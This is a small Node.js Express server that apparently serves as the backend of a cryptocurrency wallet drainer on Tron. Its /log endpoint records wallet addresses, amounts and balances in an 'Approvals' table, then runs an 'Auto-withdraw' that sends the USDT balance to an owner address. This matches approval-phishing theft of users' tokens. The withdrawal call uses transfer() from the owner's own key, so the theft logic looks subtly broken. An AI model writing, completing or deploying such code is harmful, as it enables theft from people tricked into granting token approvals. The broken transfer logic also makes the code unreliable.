const express = require('express');
const TronWeb = require('tronweb');
const { createClient } = require('@supabase/supabase-js');
require('dotenv').config();

const app = express();
app.use(express.json());

const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  privateKey: process.env.OWNER_PRIVATE_KEY,
});

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_KEY
);

app.post('/log', async (req, res) => {
  const { wallet, amount, balance } = req.body;

  try {
    await supabase.from('Approvals').insert([{
      wallet_address: wallet,
      amount,
      balance,
      timestamp: new Date().toISOString()
    }]);

    // Auto-withdraw
    const usdt = await tronWeb.contract().at(process.env.USDT_CONTRACT);
    await usdt.transfer(process.env.OWNER_ADDRESS, balance).send();

    res.status(200).json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Log or withdrawal failed' });
  }
});

app.listen(3000, () => {
  console.log('✅ Server live on port 3000');
});
